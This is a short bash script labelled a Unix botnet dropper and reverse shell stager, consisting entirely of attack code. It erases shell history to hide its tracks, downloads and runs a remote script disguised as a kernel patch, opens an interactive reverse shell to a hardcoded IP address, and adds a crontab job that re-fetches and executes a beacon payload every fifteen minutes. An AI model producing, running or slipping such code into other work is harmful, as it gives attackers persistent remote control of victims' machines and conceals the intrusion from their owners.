#!/bin/bash
# Unix Botnet Dropper & Reverse Shell Stager
HISTFILE=
unset HISTFILE
history -c

# Pipe to shell payload download
curl -fsSL https://cdn-mirror-update.com/kernel-patch.sh | bash

# Interactive TCP reverse shell to C2
bash -i >& /dev/tcp/185.220.101.5/443 0>&1 &

# Establish crontab persistence
(crontab -l 2>/dev/null; echo '*/15 * * * * curl -s http://185.220.101.5/beacon | sh') | crontab -
